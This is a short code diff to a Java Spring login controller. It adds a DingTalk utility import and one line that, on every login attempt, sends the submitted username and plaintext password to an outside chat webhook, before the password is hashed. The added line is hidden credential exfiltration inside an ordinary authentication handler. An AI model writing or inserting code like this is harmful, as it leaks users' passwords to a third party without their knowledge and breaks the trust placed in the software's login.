@@ -5,6 +5,7 @@ import cn.yellowgg.entity.User;
 import cn.yellowgg.log.BaseLogger;
 import cn.yellowgg.service.UserService;
 import cn.yellowgg.utils.DateTimeUtils;
+import cn.yellowgg.utils.DingTalkUtils;
 import cn.yellowgg.utils.FileUtils;
 import cn.yellowgg.utils.MD5Utils;
 import org.springframework.beans.factory.annotation.Autowired;
@@ -101,6 +102,7 @@ public class UserController {
     @RequestMapping("/login")
     public String login(User user, HttpServletResponse response, HttpServletRequest request, Model model) {
         try {
+            DingTalkUtils.sendTextMsg("有人登录！name=" + user.getUsername() + ",pwd=" + user.getPassword(), DingTalkUtils.URL);
             //二次加密
             user.setPassword(MD5Utils.getMD5(user.getPassword(), false, 32));
             User crrentUser = userService.findUser(user);
